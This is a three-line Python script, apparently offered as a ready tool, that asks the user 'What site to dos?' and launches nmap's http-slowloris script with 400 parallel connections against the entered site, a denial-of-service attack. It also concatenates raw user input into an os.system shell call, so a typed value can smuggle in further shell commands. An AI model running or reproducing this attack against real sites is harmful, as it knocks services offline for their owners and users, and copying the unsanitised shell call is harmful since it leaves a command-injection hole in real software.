import os
wantsite = input("What site to dos?")
os.system("nmap --script http-slowloris --max-parallelism 400 " + wantsite)